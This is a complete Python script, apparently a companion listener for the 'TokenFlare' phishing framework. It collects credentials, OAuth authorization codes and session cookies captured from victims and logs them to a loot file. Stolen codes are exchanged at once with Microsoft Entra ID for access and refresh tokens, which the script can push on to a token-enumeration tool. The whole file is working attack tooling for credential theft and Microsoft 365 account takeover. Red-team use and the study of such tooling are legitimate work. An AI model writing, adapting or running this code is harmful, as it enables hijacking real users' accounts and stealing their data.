#!/usr/bin/env python3
"""
TokenFlare Local Webhook Listener with Auto Token Exchange

Receives captured credentials, auth codes, and cookies from TokenFlare.
Automatically exchanges auth codes for access + refresh tokens via Entra ID.
Optionally pushes tokens to TokenSmith for immediate enumeration.

Usage:
    python tokenflare-webhook.py                             # Listen on port 9999
    python tokenflare-webhook.py -p 8080                     # Custom port
    python tokenflare-webhook.py -p 9999 -o loot.json        # Log to file
    python tokenflare-webhook.py --tokensmith-url http://localhost:1337  # Auto-push
    python tokenflare-webhook.py --show-raw                  # Print raw JSON

Set WEBHOOK_URL in wrangler.toml to: http://localhost:9999/webhook
"""

import argparse
import base64
import json
import sys
import os
import threading
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# ANSI colors for terminal output
class C:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'

# Disable colors if not a TTY (e.g., piped to file)
if not sys.stdout.isatty():
    for attr in ['RED', 'GREEN', 'YELLOW', 'CYAN', 'BOLD', 'DIM', 'RESET']:
        setattr(C, attr, '')

BANNER = f"""{C.RED}
 ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄   ▄ ▄▄▄▄▄▄▄ ▄▄    ▄ ▄▄▄▄▄▄▄ ▄▄▄     ▄▄▄▄▄▄▄ ▄▄▄▄▄▄   ▄▄▄▄▄▄▄
█       █       █   █ █ █       █  █  █ █       █   █   █       █   ▄  █ █       █
█▄     ▄█   ▄   █   █▄█ █    ▄▄▄█   █▄█ █    ▄▄▄█   █   █   ▄   █  █ █ █ █    ▄▄▄█
  █   █ █  █ █  █      ▄█   █▄▄▄█       █   █▄▄▄█   █   █  █▄█  █   █▄▄█▄█   █▄▄▄
  █   █ █  █▄█  █     █▄█    ▄▄▄█  ▄    █    ▄▄▄█   █▄▄▄█       █    ▄▄  █    ▄▄▄█
  █   █ █       █    ▄  █   █▄▄▄█ █ █   █   █   █       █   ▄   █   █  █ █   █▄▄▄
  █▄▄▄█ █▄▄▄▄▄▄▄█▄▄▄█ █▄█▄▄▄▄▄▄▄█▄█  █▄▄█▄▄▄█   █▄▄▄▄▄▄▄█▄▄█ █▄▄█▄▄▄█  █▄█▄▄▄▄▄▄▄█
{C.RESET}{C.CYAN}                                    Local Webhook Listener{C.RESET}
"""

# Track capture counts
stats = {'credentials': 0, 'auth_codes': 0, 'cookies': 0, 'exchanges': 0, 'other': 0}

# Thread lock for file writes
log_lock = threading.Lock()


# ─────────────────────────────────────────────────────────────
# Message classification and extraction
# ─────────────────────────────────────────────────────────────

def classify_message(message):
    """Classify a TokenFlare notification by type."""
    if not message:
        return 'other', {}

    msg = message if isinstance(message, str) else str(message)

    if 'Password Captured' in msg:
        data = {}
        for line in msg.split('\n'):
            line = line.strip()
            if line.startswith('User:'):
                data['username'] = line[5:].strip()
            elif line.startswith('Password:'):
                data['password'] = line[9:].strip()
        return 'credentials', data

    elif 'Auth Code' in msg:
        data = {}
        for line in msg.split('\n'):
            line = line.strip()
            if line.startswith('Code URL:'):
                data['code_url'] = line[9:].strip()
        return 'auth_code', data

    elif 'Cookies Captured' in msg:
        parts = msg.split('\n\n', 1)
        data = {'cookies': parts[1] if len(parts) > 1 else msg}
        return 'cookies', data

    return 'other', {'raw': msg}


def extract_message(body):
    """Extract the message string from any webhook format."""
    if isinstance(body, str):
        try:
            body = json.loads(body)
        except json.JSONDecodeError:
            return body

    if not isinstance(body, dict):
        return str(body)

    # Generic format
    if 'message' in body:
        return body['message']
    # Slack format
    if 'text' in body:
        return body['text']
    # Discord format
    if 'content' in body:
        return body['content']
    # Teams format
    if 'sections' in body and isinstance(body['sections'], list):
        for section in body['sections']:
            if isinstance(section, dict) and 'text' in section:
                return section['text'].replace('<br>', '\n')

    return json.dumps(body, indent=2)


# ─────────────────────────────────────────────────────────────
# Terminal display
# ─────────────────────────────────────────────────────────────

def print_capture(event_type, data, raw_body, show_raw=False):
    """Pretty-print a captured event to the terminal."""
    now = datetime.now().strftime('%H:%M:%S')
    separator = f"{C.DIM}{'─' * 60}{C.RESET}"

    print(separator)

    if event_type == 'credentials':
        stats['credentials'] += 1
        print(f"  {C.RED}{C.BOLD}CREDENTIALS CAPTURED{C.RESET}  {C.DIM}[{now}]{C.RESET}")
        print(f"  {C.YELLOW}Username:{C.RESET} {data.get('username', 'N/A')}")
        print(f"  {C.RED}Password:{C.RESET} {data.get('password', 'N/A')}")

    elif event_type == 'auth_code':
        stats['auth_codes'] += 1
        print(f"  {C.GREEN}{C.BOLD}AUTH CODE OBTAINED{C.RESET}  {C.DIM}[{now}]{C.RESET}")
        code_url = data.get('code_url', 'N/A')
        if 'code=' in code_url:
            code = code_url.split('code=')[1].split('&')[0]
            print(f"  {C.GREEN}Code:{C.RESET} {code[:80]}...")
        print(f"  {C.DIM}Full URL:{C.RESET} {code_url[:120]}{'...' if len(code_url) > 120 else ''}")

    elif event_type == 'cookies':
        stats['cookies'] += 1
        print(f"  {C.CYAN}{C.BOLD}COOKIES CAPTURED{C.RESET}  {C.DIM}[{now}]{C.RESET}")
        cookies = data.get('cookies', '')
        for line in cookies.split('\n'):
            line = line.strip()
            if line:
                if '=' in line:
                    name, _, value = line.partition('=')
                    if len(value) > 80:
                        value = value[:80] + '...'
                    print(f"  {C.CYAN}{name}={C.RESET}{value}")
                else:
                    print(f"  {line}")

    else:
        stats['other'] += 1
        print(f"  {C.YELLOW}{C.BOLD}WEBHOOK RECEIVED{C.RESET}  {C.DIM}[{now}]{C.RESET}")
        print(f"  {data.get('raw', json.dumps(raw_body, indent=2))}")

    if show_raw:
        print(f"\n  {C.DIM}Raw JSON:{C.RESET}")
        print(f"  {C.DIM}{json.dumps(raw_body, indent=2)}{C.RESET}")

    print(separator)
    print_stats()


def print_stats():
    """Print running totals."""
    print(f"  {C.DIM}Totals: {stats['credentials']} creds | {stats['auth_codes']} codes | "
          f"{stats['cookies']} cookies | {stats['exchanges']} exchanges{C.RESET}\n")


# ─────────────────────────────────────────────────────────────
# Auth code exchange
# ─────────────────────────────────────────────────────────────

def exchange_auth_code(payload, server_ctx):
    """
    Exchange an OAuth2 authorization code for tokens.

    All TokenFlare OAuth clients are PUBLIC clients (no client_secret needed):
      - Office Home (4765445b)
      - Azure PowerShell (1950a258)
      - Teams (1fec8e78)
      - Intune (9ba1a5c7)
    """
    code = payload.get('code')
    client_id = payload.get('client_id')
    redirect_uri = payload.get('redirect_uri')

    if not all([code, client_id, redirect_uri]):
        print(f"  {C.RED}Exchange failed: missing code, client_id, or redirect_uri{C.RESET}")
        return

    capture_time = datetime.now()
    print(f"\n  {C.YELLOW}{C.BOLD}EXCHANGING AUTH CODE...{C.RESET}  "
          f"{C.DIM}[{capture_time.strftime('%H:%M:%S')}]{C.RESET}")
    print(f"  {C.DIM}Client ID:{C.RESET} {client_id}")
    print(f"  {C.DIM}Redirect URI:{C.RESET} {redirect_uri}")
    print(f"  {C.DIM}Code (first 40 chars):{C.RESET} {code[:40]}...")

    # Build token exchange request
    token_url = 'https://login.microsoftonline.com/common/oauth2/v2.0/token'
    form_data = urllib.parse.urlencode({
        'grant_type': 'authorization_code',
        'client_id': client_id,
        'redirect_uri': redirect_uri,
        'code': code,
    }).encode('utf-8')

    try:
        req = urllib.request.Request(
            token_url,
            data=form_data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            method='POST',
        )

        with urllib.request.urlopen(req, timeout=30) as resp:
            token_data = json.loads(resp.read().decode('utf-8'))

        elapsed = (datetime.now() - capture_time).total_seconds()

        # Success
        print_token_result(token_data, elapsed)
        store_tokens(token_data, payload, server_ctx)
        stats['exchanges'] += 1

        # Optional: push to TokenSmith
        if server_ctx.tokensmith_url:
            push_to_tokensmith(token_data, server_ctx.tokensmith_url)

    except urllib.error.HTTPError as e:
        error_body = e.read().decode('utf-8', errors='replace')
        print(f"  {C.RED}Exchange FAILED: HTTP {e.code}{C.RESET}")
        print(f"  {C.DIM}{error_body[:300]}{C.RESET}")
        log_failed_exchange(payload, error_body, server_ctx)

    except Exception as e:
        print(f"  {C.RED}Exchange FAILED: {e}{C.RESET}")
        log_failed_exchange(payload, str(e), server_ctx)


def print_token_result(token_data, elapsed):
    """Pretty-print the token exchange result."""
    separator = f"{C.DIM}{'=' * 60}{C.RESET}"
    print(separator)
    print(f"  {C.GREEN}{C.BOLD}TOKEN EXCHANGE SUCCESSFUL{C.RESET}  ({elapsed:.1f}s)")

    access_token = token_data.get('access_token', '')
    refresh_token = token_data.get('refresh_token', '')
    id_token = token_data.get('id_token', '')
    scope = token_data.get('scope', '')
    expires_in = token_data.get('expires_in', 0)

    print(f"  {C.GREEN}Scope:{C.RESET} {scope}")
    print(f"  {C.GREEN}Expires in:{C.RESET} {expires_in}s ({expires_in // 60}m)")

    if access_token:
        print(f"  {C.GREEN}Access Token:{C.RESET} {access_token[:50]}...({len(access_token)} chars)")
    else:
        print(f"  {C.YELLOW}Access Token:{C.RESET} NOT PRESENT")

    if refresh_token:
        print(f"  {C.GREEN}Refresh Token:{C.RESET} {refresh_token[:50]}...({len(refresh_token)} chars)")
    else:
        print(f"  {C.YELLOW}Refresh Token:{C.RESET} NOT PRESENT (add offline_access to scope)")

    if id_token:
        print(f"  {C.GREEN}ID Token:{C.RESET} {id_token[:50]}...({len(id_token)} chars)")

    # Decode JWT to show user/tenant info
    try:
        payload_b64 = access_token.split('.')[1]
        payload_b64 += '=' * (4 - len(payload_b64) % 4)
        jwt_payload = json.loads(base64.urlsafe_b64decode(payload_b64))
        print(f"  {C.CYAN}Token audience:{C.RESET} {jwt_payload.get('aud', 'unknown')}")
        print(f"  {C.CYAN}User:{C.RESET} {jwt_payload.get('upn', jwt_payload.get('unique_name', 'unknown'))}")
        print(f"  {C.CYAN}Tenant:{C.RESET} {jwt_payload.get('tid', 'unknown')}")
    except Exception:
        pass

    print(separator)


def store_tokens(token_data, original_payload, server_ctx):
    """Store exchanged tokens to the log file."""
    if not server_ctx.log_file:
        return

    entry = {
        'timestamp': datetime.now().isoformat(),
        'type': 'token_exchange',
        'data': {
            'access_token': token_data.get('access_token'),
            'refresh_token': token_data.get('refresh_token'),
            'id_token': token_data.get('id_token'),
            'scope': token_data.get('scope'),
            'expires_in': token_data.get('expires_in'),
            'token_type': token_data.get('token_type'),
            'client_id': original_payload.get('client_id'),
        },
        'original_code_payload': {
            'client_id': original_payload.get('client_id'),
            'redirect_uri': original_payload.get('redirect_uri'),
            'scope': original_payload.get('scope'),
            'capture_timestamp': original_payload.get('timestamp'),
        },
    }
    with log_lock:
        with open(server_ctx.log_file, 'a') as f:
            f.write(json.dumps(entry) + '\n')

    print(f"  {C.DIM}Tokens saved to {server_ctx.log_file}{C.RESET}")


def log_failed_exchange(payload, error, server_ctx):
    """Log failed exchange with raw code for manual retry."""
    print(f"  {C.YELLOW}Raw code saved for manual retry{C.RESET}")

    if not server_ctx.log_file:
        print(f"  {C.RED}Code (SAVE THIS — expires in ~10 min):{C.RESET}")
        print(f"  {payload.get('code', 'N/A')}")
        return

    entry = {
        'timestamp': datetime.now().isoformat(),
        'type': 'exchange_failed',
        'error': error[:500],
        'data': {
            'code': payload.get('code'),
            'client_id': payload.get('client_id'),
            'redirect_uri': payload.get('redirect_uri'),
        },
    }
    with log_lock:
        with open(server_ctx.log_file, 'a') as f:
            f.write(json.dumps(entry) + '\n')


# ─────────────────────────────────────────────────────────────
# TokenSmith integration
# ─────────────────────────────────────────────────────────────

def push_to_tokensmith(token_data, tokensmith_url):
    """Push exchanged tokens to TokenSmith's session import API."""
    import_url = tokensmith_url.rstrip('/') + '/api/session/import'

    payload = json.dumps({
        'access_token': token_data.get('access_token'),
        'refresh_token': token_data.get('refresh_token'),
    }).encode('utf-8')

    try:
        req = urllib.request.Request(
            import_url,
            data=payload,
            headers={'Content-Type': 'application/json'},
            method='POST',
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            result = json.loads(resp.read().decode('utf-8'))

        token_id = result.get('token_id', result.get('id', 'unknown'))
        print(f"  {C.GREEN}{C.BOLD}PUSHED TO TOKENSMITH{C.RESET}")
        print(f"  {C.DIM}Token ID: {token_id}{C.RESET}")

    except Exception as e:
        print(f"  {C.YELLOW}TokenSmith push failed: {e}{C.RESET}")
        print(f"  {C.DIM}Tokens are still saved locally — import manually{C.RESET}")


# ─────────────────────────────────────────────────────────────
# HTTP handler
# ─────────────────────────────────────────────────────────────

def create_handler(log_file=None, show_raw=False):
    """Create a request handler class with the given options."""

    class WebhookHandler(BaseHTTPRequestHandler):
        def do_POST(self):
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length == 0:
                self.send_response(200)
                self.end_headers()
                return

            raw = self.rfile.read(content_length)

            try:
                body = json.loads(raw)
            except json.JSONDecodeError:
                body = {'raw': raw.decode('utf-8', errors='replace')}

            # Route based on path
            path = self.path.rstrip('/')
            if path == '/exchange':
                self._handle_exchange(body)
            else:
                self._handle_webhook(body)

        def _handle_webhook(self, body):
            """Handle human-readable webhook notifications."""
            message = extract_message(body)
            event_type, data = classify_message(message)
            print_capture(event_type, data, body, show_raw=show_raw)

            if log_file:
                entry = {
                    'timestamp': datetime.now().isoformat(),
                    'type': event_type,
                    'data': data,
                    'raw': body,
                }
                with log_lock:
                    with open(log_file, 'a') as f:
                        f.write(json.dumps(entry) + '\n')

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')

        def _handle_exchange(self, body):
            """Handle structured auth code payload — exchange for tokens."""
            # Respond immediately so the worker doesn't block
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')

            # Exchange in a background thread
            t = threading.Thread(target=exchange_auth_code, args=(body, self.server))
            t.daemon = True
            t.start()

        def do_GET(self):
            """Health check / status endpoint."""
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            response = json.dumps({
                'status': 'listening',
                'captures': stats,
                'exchange_enabled': True,
                'tokensmith_url': getattr(self.server, 'tokensmith_url', None),
            })
            self.wfile.write(response.encode())

        def log_message(self, format, *args):
            """Suppress default HTTP logging — we print our own output."""
            pass

    return WebhookHandler


# ─────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description='TokenFlare Local Webhook Listener with Auto Token Exchange',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s                                        Listen on port 9999
  %(prog)s -p 8080                                Custom port
  %(prog)s -p 9999 -o loot.json                   Log captures + tokens to file
  %(prog)s --tokensmith-url http://localhost:1337  Auto-push tokens to TokenSmith
  %(prog)s --show-raw                             Show raw JSON payloads

Endpoints:
  POST /webhook    Human-readable notifications (creds, auth codes, cookies)
  POST /exchange   Structured auth code payload (auto-exchanged for tokens)
  GET  /           Health check and capture stats

Set in wrangler.toml:
  WEBHOOK_URL = "http://localhost:9999/webhook"
"""
    )
    parser.add_argument('-p', '--port', type=int, default=9999,
                        help='Port to listen on (default: 9999)')
    parser.add_argument('-o', '--output', type=str, default=None,
                        help='Log captures and tokens to file (JSONL format)')
    parser.add_argument('--show-raw', action='store_true',
                        help='Print raw JSON payloads')
    parser.add_argument('-b', '--bind', type=str, default='0.0.0.0',
                        help='Address to bind to (default: 0.0.0.0)')
    parser.add_argument('--tokensmith-url', type=str, default=None,
                        help='TokenSmith URL for auto-import (e.g., http://localhost:1337)')

    args = parser.parse_args()

    print(BANNER)
    print(f"  {C.BOLD}Listening on {args.bind}:{args.port}{C.RESET}")
    print(f"  {C.DIM}Set WEBHOOK_URL in wrangler.toml to:{C.RESET}")
    print(f"  {C.CYAN}http://localhost:{args.port}/webhook{C.RESET}")
    print()
    print(f"  {C.DIM}Endpoints:{C.RESET}")
    print(f"    {C.DIM}POST /webhook   — human-readable notifications{C.RESET}")
    print(f"    {C.GREEN}POST /exchange  — auto token exchange{C.RESET}")
    print(f"    {C.DIM}GET  /          — health check{C.RESET}")
    if args.output:
        print(f"\n  {C.DIM}Logging to:{C.RESET} {args.output}")
    if args.tokensmith_url:
        print(f"  {C.GREEN}TokenSmith auto-push:{C.RESET} {args.tokensmith_url}")
    else:
        print(f"  {C.DIM}TokenSmith auto-push:{C.RESET} disabled (use --tokensmith-url to enable)")
    print(f"\n  {C.DIM}Waiting for captures... (Ctrl+C to stop){C.RESET}\n")

    handler = create_handler(log_file=args.output, show_raw=args.show_raw)
    server = HTTPServer((args.bind, args.port), handler)
    # Attach config to server so handlers can access it
    server.log_file = args.output
    server.show_raw = args.show_raw
    server.tokensmith_url = args.tokensmith_url

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n\n  {C.BOLD}Session Summary{C.RESET}")
        print(f"  {C.RED}Credentials:{C.RESET}  {stats['credentials']}")
        print(f"  {C.GREEN}Auth codes:{C.RESET}   {stats['auth_codes']}")
        print(f"  {C.CYAN}Cookies:{C.RESET}      {stats['cookies']}")
        print(f"  {C.GREEN}Exchanges:{C.RESET}    {stats['exchanges']}")
        print(f"  {C.DIM}Other:{C.RESET}        {stats['other']}")
        if args.output and os.path.exists(args.output):
            print(f"\n  {C.DIM}Captures saved to:{C.RESET} {args.output}")
        print()
        server.server_close()


if __name__ == '__main__':
    main()
